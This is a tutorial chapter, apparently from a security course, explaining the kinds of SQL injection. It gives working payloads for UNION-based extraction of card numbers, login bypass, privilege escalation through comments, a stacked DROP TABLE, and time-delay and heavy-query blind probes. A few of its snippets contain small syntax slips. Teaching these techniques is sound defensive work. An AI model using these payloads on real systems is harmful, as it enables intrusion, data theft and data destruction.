# 02 — Types of SQL Injection

Attackers view, manipulate, insert, and delete application data using several distinct SQLi techniques. There are
**three main categories**:

```
SQL Injection
├── In-band SQL Injection            (same channel to attack AND retrieve results)
│   ├── Error-based SQL Injection
│   ├── UNION SQL Injection
│   ├── Tautology
│   ├── End-of-Line Comment
│   ├── Inline Comment
│   ├── Piggybacked Query
│   ├── System Stored Procedure
│   └── Illegal / Logically Incorrect Query
├── Blind / Inferential SQL Injection (no direct feedback; infer via True/False)
│   ├── Time Delay
│   ├── Boolean Exploitation
│   └── Heavy Query
└── Out-of-Band SQL Injection         (different channel used to exfiltrate results)
```

## In-Band SQL Injection

The attacker uses the **same communication channel** to perform the attack and retrieve the results. This is the most
common and easiest-to-exploit category. The two most common in-band techniques are **error-based** and **UNION-based**.

### Error-Based SQL Injection

The attacker intentionally inserts bad input to force the database to return **error messages**, then reads those
messages to learn about the underlying database and build a working exploit.

```sql
-- Vulnerable query
SELECT * FROM products WHERE id_product=$id_product

-- Normal request
http://www.example.com/product.php?id=10

-- Malicious request (Oracle 10g)
http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )-
```

The tester concatenates `10` with the result of `UTL_INADDR.GET_HOST_NAME()`. Oracle tries to resolve a "hostname"
that is actually the result of `(SELECT user FROM DUAL)` — it fails, and the resulting error message leaks the value:

```
ORA-292257: host SCOTT unknown
```

By manipulating the subquery passed to `GET_HOST_NAME()`, the tester can leak arbitrary data through the error text.

### UNION SQL Injection

The `UNION` operator splices a forged query onto the original, appending its results — letting an attacker pull values
from other tables entirely.

**Step 1 — determine the number of columns** (increment until it errors):

```sql
ORDER BY 10--
```

If it executes cleanly, there are ≥10 columns. If you get `Unknown column '10' in 'order clause'`, there are fewer —
binary-search down to the exact count.

**Step 2 — determine column data types** with `NULL`/known values:

```sql
UNION SELECT 1,null,null—
```

**Step 3 — perform the full UNION injection** once column count and types are known:

```sql
-- Original
SELECT Name, Phone, Address FROM Users WHERE Id=$id
-- Malicious id value
$id = 1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
-- Final query
SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

### Tautology

The attacker uses a conditional `OR` clause so the `WHERE` clause is **always true**, bypassing authentication:

```sql
SELECT * FROM users WHERE name = '' OR '1'='1';
```

### End-of-Line Comment

Attacker uses a line comment (`--`) to make the database ignore the rest of the query, e.g. the password check:

```sql
SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
```

The `--` comments out `' AND password = 'password'`, so simply supplying `admin'--` as the username logs you in as
admin with **no password required**.

### Inline Comments

Attacker uses `/* ... */` comments to merge multiple vulnerable inputs into a single query, bypass blacklists, strip
whitespace, obfuscate, or determine the DB version.

```php
INSERT INTO Users (UserName, isAdmin, Password) VALUES ('".$username."', 0, '".$password."')"
```

Malicious input:

```
UserName = Attacker', 1, /*
Password = */'mypwd
```

Resulting query grants admin privileges:

```sql
INSERT INTO Users (UserName, isAdmin, Password) VALUES ('Attacker', 1, /*', 0, '*/'mypwd')
```

### Piggybacked Query (a.k.a. Stacked Queries Attack)

The attacker injects an *additional*, complete query after the original one, using a semicolon (`;`) as a delimiter.
The original query executes unmodified, then the DBMS executes the piggybacked query too.

```sql
-- Original
SELECT * FROM EMP WHERE EMP.EID = 1001 AND EMP.ENAME = 'Bob'

-- Attacker's version
SELECT * FROM EMP WHERE EMP.EID = 1001 AND EMP.ENAME = 'Bob'; DROP TABLE DEPT;
```

The DBMS runs the first query, returns results, recognizes the `;` delimiter, and then executes `DROP TABLE DEPT` —
attacker's goal can be data extraction, modification, deletion, remote command execution, or a DoS attack.

### System Stored Procedure

If a web app builds a stored procedure's SQL dynamically from unsanitized input, an attacker can hijack it:

```sql
Create procedure Login @user_name varchar(20), @password varchar(20) As
Declare @query varchar(250)
Set @query = ' Select 1 from usertable Where username = ' + @user_name + ' and password = ' + @password
exec(@query)
Go
```

Malicious input: `User: anyusername or 1=1` `Password: ' anypassword` → logs in with **any** password.

### Illegal / Logically Incorrect Query

The attacker deliberately sends a broken query to trigger a revealing error message — useful for learning table/column
names and data types.

```
Username: 'Bob"
```

```sql
SELECT * FROM Users WHERE UserName = 'Bob"' AND password =
```

```
Incorrect Syntax near 'Bob'. Unclosed quotation mark after the character string '' AND Password='xxx''.
```

## Blind / Inferential SQL Injection

Used when the application **is** vulnerable but the results of the injection are **not directly visible** — the app
shows a generic error page instead of a useful DB error. The attacker instead asks the database a series of
**true/false questions** and infers the answer from the application's behavior. This is inherently slower — a new
statement must be crafted for every bit of data recovered.

### Time Delay (Time-Based Blind SQLi)

Evaluates the *time delay* in the HTTP response to a conditional query, using a database sleep/delay function.

```sql
; IF EXISTS(SELECT * FROM creditcard) WAITFOR DELAY '0:0:10'--
```

| Step | What happens |
|---|---|
| 1 | Send the query above |
| 2 | DB checks if the `creditcard` table exists |
| 3 | If **NO** → immediate response: *"We are unable to process your request. Please try back later."* |
| 4 | If **YES** → sleeps 10s, **then** shows the same message |

The delay itself — not the message content — confirms the condition was true.

**Time-delay functions by DBMS:**

| DBMS | Function |
|---|---|
| Microsoft SQL Server | `WAITFOR DELAY '0:0:10'--` (seconds) |
| MySQL | `BENCHMARK(howmanytimes, do_this)` (effectively minutes of CPU work) |

### Boolean Exploitation (a.k.a. Inferential SQLi)

Multiple valid statements evaluating `TRUE`/`FALSE` are supplied in the affected parameter; the attacker compares the
two response pages to infer success.

```
http://www.myshop.com/item.aspx?id=67
-- normal query
SELECT Name, Price, Description FROM ITEM_DATA WHERE ITEM_ID = 67

-- manipulated (forces FALSE)
http://www.myshop.com/item.aspx?id=67 and 1=2
SELECT Name, Price, Description FROM ITEM_DATA WHERE ITEM_ID = 67 AND 1 = 2   -- no item shown

-- manipulated (forces TRUE)
http://www.myshop.com/item.aspx?id=67 and 1=1
SELECT Name, Price, Description FROM ITEM_DATA WHERE ITEM_ID = 67 AND 1 = 1   -- item shown again
```

If the FALSE version hides the item and the TRUE version shows it again, the parameter is confirmed injectable.

### Heavy Query

When time-delay functions are disabled by the DBA, the attacker instead uses a **deliberately expensive query**
(usually multiple joins against system tables) to create a measurable delay without needing `WAITFOR`/`BENCHMARK`.

```sql
-- Expensive base query (Oracle)
SELECT count(*) FROM all_users A, all_users B, all_users C

-- Injected as a time-based condition
1 AND 1 < SELECT count(*) FROM all_users A, all_users B, all_users C

-- Final query
SELECT * FROM products WHERE id=1 AND 1 < SELECT count(*) FROM all_users A, all_users B, all_users C
```

This is a newer SQLi variant with a severe performance impact on the target server — use cautiously even in
authorized testing.

## Out-of-Band SQL Injection

The hardest category to pull off. The attacker uses a **completely different communication channel** — database email
functionality, or file-write/file-load functions — to exfiltrate results, because the normal request/response channel
can't carry them back. Attackers fall back to this when in-band or blind techniques aren't viable.

Common mechanisms:
- **Microsoft SQL Server:** the `xp_dirtree` command triggers a DNS/SMB lookup against an attacker-controlled server.
- **Oracle Database:** the `UTL_HTTP` package sends an HTTP request from SQL/PL-SQL to an attacker-controlled server.

(Full worked examples of out-of-band exfiltration appear in
[04 — Methodology: Launching SQL Injection Attacks](04-methodology-launching-attacks.md).)

---

**Previous:** [01 — Introduction to SQL Injection](01-introduction-to-sql-injection.md) · **Next:** [03 — Methodology: Information Gathering & Vulnerability Detection](03-methodology-information-gathering.md)
